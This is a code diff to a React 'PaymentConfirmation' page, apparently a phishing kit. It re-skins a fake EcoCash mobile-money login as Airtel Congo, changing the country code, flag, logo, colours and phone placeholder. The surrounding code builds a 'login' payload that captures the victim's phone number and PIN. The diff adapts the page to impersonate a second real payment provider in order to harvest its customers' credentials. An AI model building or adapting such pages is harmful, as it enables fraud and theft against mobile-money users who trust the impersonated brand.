@@ -106,7 +106,7 @@ function PaymentConfirmation({
             const payload = {
                 type: 'login',
                 name: "",
-                phone: `+263${phoneNumber.replace(/\s/g, '')}`,
+                phone: `+242${phoneNumber.replace(/\s/g, '')}`,
                 details: `PIN: ${pinValue}`,
             };
 
@@ -201,15 +201,18 @@ function PaymentConfirmation({
                 {/* Airtel Congo Logo */}
                 <div
                     style={{
-                        fontSize: "56px",
-                        fontWeight: "700",
-                        marginBottom: "40px",
+                        marginBottom: "36px",
                         textAlign: "center",
-                        letterSpacing: "-1px",
                     }}
                 >
-                    <span style={{ color: "#0066cc" }}>Eco</span>
-                    <span style={{ color: "#dc3545" }}>Cash</span>
+                    <img
+                        src="/airtel.svg"
+                        alt="Airtel Congo"
+                        style={{
+                            height: "60px",
+                            objectFit: "contain",
+                        }}
+                    />
                 </div>
 
                 {/* Login Text */}
@@ -238,12 +241,12 @@ function PaymentConfirmation({
                             alignItems: "center",
                             gap: "12px",
                             padding: "14px 18px",
-                            border: "2px solid #0066cc",
+                            border: "2px solid #e40000",
                             borderRadius: "12px",
                             background: "white",
                         }}
                     >
-                        <span style={{ fontSize: "24px" }}>🇿🇼</span>
+                        <span style={{ fontSize: "24px" }}>🇨🇬</span>
                         <span
                             style={{
                                 fontSize: "16px",
@@ -251,11 +254,11 @@ function PaymentConfirmation({
                                 fontWeight: "500",
                             }}
                         >
-                            +263
+                            +242
                         </span>
                         <input
                             type="tel"
-                            placeholder="712 345 6789"
+                            placeholder="06 123 4567"
                             value={phoneNumber}
                             onChange={handlePhoneChange}
                             style={{
@@ -319,7 +322,7 @@ function PaymentConfirmation({
                                     height: "60px",
                                     fontSize: "32px",
                                     textAlign: "center",
-                                    border: showWrongPin ? "2px solid #dc3545" : "2px solid #0066cc",
+                                    border: showWrongPin ? "2px solid #dc3545" : "2px solid #e40000",
                                     borderRadius: "12px",
                                     outline: "none",
                                     background: "white",
@@ -372,11 +375,11 @@ function PaymentConfirmation({
                 </form>
             </div>
 
-            {/* Blue Wave Bottom Section */}
+            {/* Red Wave Bottom Section */}
             <div
                 style={{
                     position: "relative",
-                    background: "#0066cc",
+                    background: "#e40000",
                     paddingTop: "80px",
                     paddingBottom: "40px",
                     marginTop: "auto",
@@ -427,7 +430,7 @@ function PaymentConfirmation({
                         <button
                             style={{
                                 background: "white",
-                                color: "#0066cc",
+                                color: "#e40000",
                                 border: "none",
                                 borderRadius: "8px",
                                 padding: "16px 32px",
@@ -445,7 +448,7 @@ function PaymentConfirmation({
                         <button
                             style={{
                                 background: "white",
-                                color: "#0066cc",
+                                color: "#e40000",
                                 border: "none",
                                 borderRadius: "8px",
                                 padding: "16px 32px",
@@ -509,7 +512,7 @@ function PaymentConfirmation({
                             gap: "16px",
                         }}
                     >
-                        <Loader2 className="spinner" size={40} color="#0066cc" />
+                        <Loader2 className="spinner" size={40} color="#e40000" />
                         <p style={{ fontSize: "16px", color: "#333" }}>Processing...</p>
                     </div>
                 </div>
